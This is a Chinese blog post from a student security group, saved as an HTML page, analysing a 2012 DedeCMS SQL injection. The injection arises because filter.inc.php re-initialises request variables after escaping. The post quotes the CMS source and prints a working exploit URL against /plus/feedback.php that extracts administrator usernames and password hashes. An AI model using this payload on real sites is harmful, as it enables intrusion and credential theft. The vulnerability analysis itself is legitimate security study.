@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="注入,dedecms,变量覆盖," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp; &amp;nbsp; &amp;nbsp; 到小组第一次做汇报，开始把我纠结了很久，不知道讲什么，四处求助，开始说有大一的嫩娃娃们要听，我觉得讲些基础的东西比较好，比如什么注入和xss之类入门的东西，但是他们又说这次不用管大一的嫩娃娃们，我们自己平时怎么讲的就怎么讲，这个更纠结我了，想了很多东西，总感觉有点不合适，如果你讲的东西没有自己的见解并且都是大家知道的，就没有什么意义了，于是乎我左思右想，就">
+<meta name="keywords" content="注入,dedecms,变量覆盖">
+<meta property="og:type" content="article">
+<meta property="og:title" content="三叶草小组汇报--dedecms的故事">
+<meta property="og:url" content="http://yoursite.com/2012/11/16/三叶草小组汇报-dedecms的故事/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp; &amp;nbsp; &amp;nbsp; 到小组第一次做汇报，开始把我纠结了很久，不知道讲什么，四处求助，开始说有大一的嫩娃娃们要听，我觉得讲些基础的东西比较好，比如什么注入和xss之类入门的东西，但是他们又说这次不用管大一的嫩娃娃们，我们自己平时怎么讲的就怎么讲，这个更纠结我了，想了很多东西，总感觉有点不合适，如果你讲的东西没有自己的见解并且都是大家知道的，就没有什么意义了，于是乎我左思右想，就">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.268Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="三叶草小组汇报--dedecms的故事">
+<meta name="twitter:description" content="&amp;nbsp; &amp;nbsp; &amp;nbsp; 到小组第一次做汇报，开始把我纠结了很久，不知道讲什么，四处求助，开始说有大一的嫩娃娃们要听，我觉得讲些基础的东西比较好，比如什么注入和xss之类入门的东西，但是他们又说这次不用管大一的嫩娃娃们，我们自己平时怎么讲的就怎么讲，这个更纠结我了，想了很多东西，总感觉有点不合适，如果你讲的东西没有自己的见解并且都是大家知道的，就没有什么意义了，于是乎我左思右想，就">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/11/16/三叶草小组汇报-dedecms的故事/"/>
+
+
+
+
+
+  <title>三叶草小组汇报--dedecms的故事 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/11/16/三叶草小组汇报-dedecms的故事/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">三叶草小组汇报--dedecms的故事</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-11-16T21:51:29+08:00">
+                2012-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp; &nbsp; &nbsp; 到小组第一次做汇报，开始把我纠结了很久，不知道讲什么，四处求助，开始说有大一的嫩娃娃们要听，我觉得讲些基础的东西比较好，比如什么注入和xss之类入门的东西，但是他们又说这次不用管大一的嫩娃娃们，我们自己平时怎么讲的就怎么讲，这个更纠结我了，想了很多东西，总感觉有点不合适，如果你讲的东西没有自己的见解并且都是大家知道的，就没有什么意义了，于是乎我左思右想，就想到了最近的dedecms注入，注入出来的时候我就去看了具体的代码，也简单分析了一下，结合我以前看过dedecms的经验，也发现了很多有意思的东西。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;还记得在今年6月份吧！晴天小涛在90sec发了来一帖子，是关于dedecms全局变量再次覆盖的问题，当时我也去看了下dedecms的这个漏洞的具体代码，也做了一些分析，见：<a href="/0day/100.html">http://lanu.sinaapp.com/0day/100.html</a>&nbsp;当时只是在关于为什么会再次发生全局变量覆盖这个问题上做了分析，没有去关心其他的东西了，这篇文章我也在90sec上发了，当时晴天小涛回复说，哪儿还有个二次变量覆盖问题，有时间我们还可以继续分析下，当时忙着考试吧，快放假了，做学生的当时都很忙，就没有再去分析了。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;正好现在出了这个sql注入就是和我们当时说的那个二次变量覆盖有关系，我也有时间，所以就去具体看来下，分析了下！就做为小组汇报的题材了！虽然这个分析在90sec上花开若相惜也做了分析。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 前面全是废话，下面走入正题！</p>
+<p>====================================================</p>
+<p>&nbsp; &nbsp; 我们先从去年的dedecms的全局变量覆盖说起，不清楚的观众可以看下安全宝出的分析报告：<a href="http://netsecurity.51cto.com/art/201108/286898.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201108/286898.htm</a>&nbsp;，而现在我们的注入文件/plus/feedback.php 中</p>
+<p>&nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">require_once(dirname(__FILE__)."/../include/common.inc.php");
+if($cfg_feedback_forbid==’Y’) exit(’系统已经禁止评论功能！’);
+require_once(DEDEINC."/filter.inc.php");</pre>&nbsp;
+
+&nbsp;
+
+可以看出上边包含有两个文件我们先看
+
+&nbsp;
+
+<pre class="brush:php; toolbar: true; auto-links: true;">/include/common.inc.php
+
+function _RunMagicQuotes(&amp;$svar)
+{
+    if(!get_magic_quotes_gpc())
+    {
+        if( is_array($svar) )
+        {
+            foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);
+        }
+        else
+        {
+            if( strlen($svar)&gt;0 &amp;&amp; preg_match(’#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#’,$svar) )
+            {
+              exit(’Request var not allow!’);
+            }
+            $svar = addslashes($svar);
+        }
+    }
+    return $svar;
+}
+
+if (!defined(’DEDEREQUEST’)) 
+{
+    //检查和注册外部提交的变量   (2011.8.10 修改登录时相关过滤)
+    function CheckRequest(&amp;$val) {
+        if (is_array($val)) {
+            foreach ($val as $_k=&gt;$_v) {
+                if($_k == ’nvarname’) continue;
+                CheckRequest($_k); 
+                CheckRequest($val[$_k]);
+            }
+        } else
+        {
+            if( strlen($val)&gt;0 &amp;&amp; preg_match(’#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#’,$val)  )
+            {
+                exit(’Request var not allow!’);
+            }
+        }
+    }
+
+    //var_dump($_REQUEST);exit;
+    CheckRequest($_REQUEST);
+
+    foreach(Array(’_GET’,’_POST’,’_COOKIE’) as $_request)
+    {
+        foreach($$_request as $_k =&gt; $_v) 
+        {
+            if($_k == ’nvarname’) ${$_k} = $_v;
+            else ${$_k} = _RunMagicQuotes($_v);
+        }
+    }
+}</pre>
+
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;在这段代码中_RunMagicQuotes()函数是用来转义的，如果php自带的gpc没有开启，就是用他转义。</p>
+<p>然后接下来的代码就是初始化变量了，这儿初始化变量是对带入的值做了转义的，如$_GET[test]=111’ &nbsp;就会成为$test=111’</p>
+<p>这样的形式。</p>
+<p>&nbsp; &nbsp; 接下来我们再看 /plus/filter.inc.php ,这个文件主要是过滤脏话的，就是说，你说的脏话全部会被替换成&amp;#42&amp;#42&amp;#42，在代码里边的脏话替换函数是_FilterAll(),</p>
+<p>&nbsp; &nbsp; 他这个文件再次对变量进行了初始化：</p>
+<p>&nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">/&#42 对_GET,_POST,_COOKIE进行过滤 &#42/
+foreach(Array(’_GET’,’_POST’,’_COOKIE’) as $_request)
+{
+    foreach($$_request as $_k =&gt; $_v)
+    {
+        ${$_k} = _FilterAll($_k,$_v);
+    }
+}
+ </pre>
+
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看见了，这儿变量二次初始的时候只用了_FilterAll() 进行过滤，如果php自带的gpc是关闭的时候，上边common.inc.php进行的变量初始化时的$test=111’，这儿再进行变量初始化则得到$test=111’ 由于在feedback.php 文件中我们可以看出，filter.inc.php文件里面的变量初始化会在common.inc.php之后，所以$test=111’会覆盖$test=111’ 使得前面的转义失效了，最终$test=111’。</p>
+<p>&nbsp;</p>
+<p>&nbsp; &nbsp; 这就是我们能够注入的根源所在，再加上feedback中的$typeid初始化过后，就没有再次过滤了，所以我们就可以使用他注入了。</p>
+<p>&nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">exp:
+from：90sec 鬼哥
+http://127.0.0.1//plus/feedback.php?validate=swep&amp;action=send&amp;comtype=comments&amp;fid=1&amp;aid=1&amp;isconfirm=yes&amp;msg=90sec&amp;typeid=0’,’3’,’4’,’5’,’0’,’1351739660’,’0’,’0’,’0’,’0’,’0’,’aaaaaa’),(’1’,’2’,@`’`,’4’,’5’,’1’,’1351739660’, ’0’,’0’,’0’,’0’,’0’,(SELECT concat(uname,0x5f,pwd,0x5f) FROM `%23@__admin`))%23
+ </pre>
+
+<p>&nbsp;</p>
+<p>接下来我们做下思维延伸：</p>
+<p>1.懂的了原理我们就可以继续再去审计下dedecms的代码了，我们可以仔细的看下，包含有filter.inc.php的文件，说不定你也能挖出几个洞来！</p>
+<p>&nbsp;</p>
+<p>2.在filter.inc.php中有一个脏话替换函数，会把脏话替换成&amp;#42&amp;#42&amp;#42, 如果我们传如的参数里面有这样的一个字符 /他妈/ 他就会成为/&amp;#42&amp;#42&amp;#42/,我相信大家已经想到了什么。</p>
+<p>&nbsp;</p>
+<p>3.程序员不好当啊！</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/注入/" rel="tag"># 注入</a>
+          
+            <a href="/tags/dedecms/" rel="tag"># dedecms</a>
+          
+            <a href="/tags/变量覆盖/" rel="tag"># 变量覆盖</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/11/11/过正常的我想过的生活/" rel="next" title="过正常的我想过的生活">
+                <i class="fa fa-chevron-left"></i> 过正常的我想过的生活
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/11/24/vim学习笔记1/" rel="prev" title="vim学习笔记1">
+                vim学习笔记1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
